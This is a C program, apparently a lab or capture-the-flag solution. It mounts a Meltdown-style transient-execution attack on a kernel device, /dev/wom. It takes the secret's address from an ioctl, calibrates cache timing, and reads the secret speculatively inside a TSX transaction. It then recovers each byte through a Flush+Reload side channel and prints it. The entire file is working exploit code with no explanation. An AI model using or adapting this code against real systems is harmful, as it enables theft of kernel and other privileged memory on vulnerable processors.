#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <inttypes.h>
#include <malloc.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <x86intrin.h>
#include <time.h>
#include <assert.h>
#include <xmmintrin.h>

#include "asm.h"

#define SECRET_LENGTH 32
#define WOM_MAGIC_NUM 0x1337
#define WOM_GET_ADDRESS _IOR(WOM_MAGIC_NUM, 0, unsigned long)
#define STRIDE 4096
#define ROUNDS 10
#define CAL_SAMPLES 64

static volatile unsigned char sink;

static inline uint64_t time_access(volatile unsigned char *p) {
    uint64_t t1 = rdtscp();
    sink = *p;
    uint64_t t2 = rdtscp();
    return t2 - t1;
}

static inline uint64_t hit_min(volatile unsigned char *p) {
    uint64_t m = UINT64_MAX;
    for (int i = 0; i < ROUNDS; i++) {
        sink = *p;
        lfence();
        cpuid();
        uint64_t dt = time_access(p);
        if (dt < m) m = dt;
    }
    return m;
}

static inline uint64_t miss_min(volatile unsigned char *p) {
    uint64_t m = UINT64_MAX;
    for (int i = 0; i < ROUNDS; i++) {
        clflush((void*)p);
        lfence();
        cpuid();
        uint64_t dt = time_access(p);
        if (dt < m) m = dt;
    }
    return m;
}

static int calibrate_threshold(unsigned char *p) {
    uint64_t hsum = 0, msum = 0;
    for (int i = 0; i < CAL_SAMPLES; i++) { hsum += hit_min(p); msum += miss_min(p); }
    uint64_t h = hsum / CAL_SAMPLES;
    uint64_t m = msum / CAL_SAMPLES;
    return (int)((h + m) / 2);
}

int main() {
    int fd = open("/dev/wom", O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    unsigned long long secret_addr = 0;
    if (ioctl(fd, WOM_GET_ADDRESS, &secret_addr) < 0) { perror("ioctl"); return 1; }
    printf("Secret address: 0x%llx\n", secret_addr);

    int RELOADBUFFER_SIZE = 256 * STRIDE;
    uint8_t *reloadbuffer;
    if (posix_memalign((void**)&reloadbuffer, 4096, RELOADBUFFER_SIZE) != 0) {
        perror("posix_memalign failed");
        exit(1);
    }
    assert(reloadbuffer);
    for (int i = 0; i < 256; i++) {
        reloadbuffer[i * STRIDE] = 0xFF;
    }

    lfence(); cpuid();
    int CACHE_THRESHOLD = calibrate_threshold(reloadbuffer + 128 * STRIDE);

    unsigned char leaked[SECRET_LENGTH] = {0};
    int ITERATIONS = 40;

    for (int offset = 0; offset < SECRET_LENGTH; ++offset) {
        int counts[256] = {0};

        for (int it = 0; it < ITERATIONS; it++) {
            for (int i = 0; i < 256; i++) {
                clflush(reloadbuffer + i * STRIDE);
            }
            lfence(); cpuid();

            char warm[SECRET_LENGTH];
            lseek(fd, 0, SEEK_SET);
            ssize_t r = read(fd, warm, SECRET_LENGTH);
            (void)r;
            //lfence(); cpuid();

            _mm_prefetch((const char *)secret_addr + offset, _MM_HINT_T0);
            _mm_prefetch((const char *)secret_addr + offset, _MM_HINT_T0);
            lfence();
            cpuid();

            volatile uint8_t dummy;
            unsigned st = _xbegin();
            if (st == _XBEGIN_STARTED) {
                uint8_t v = *(volatile uint8_t*)(secret_addr + offset);
                dummy = reloadbuffer[v * STRIDE];
                _xend();
            }
            lfence();
            cpuid();

            for (int i = 0; i < 256; i++) {
                uint64_t k = (i + 109883 * 256) & 255;
                k = (k + 3578962147 * 4096) & 255;
                volatile uint8_t *p = (volatile uint8_t *)(reloadbuffer + (k * STRIDE));
                uint64_t dt = time_access(p);
                if ((int)dt < CACHE_THRESHOLD) {
                    counts[k]++;
                }
            }
        }

        int best = 0, bestc = -1;
        for (int v = 0; v < 256; v++) {
            if (counts[v] > bestc) {
                bestc = counts[v]; best = v;
            }
        }
        leaked[offset] = (unsigned char)best;
    }

    printf("Secret: %s\n", leaked);
    free(reloadbuffer);
    close(fd);
    return 0;
}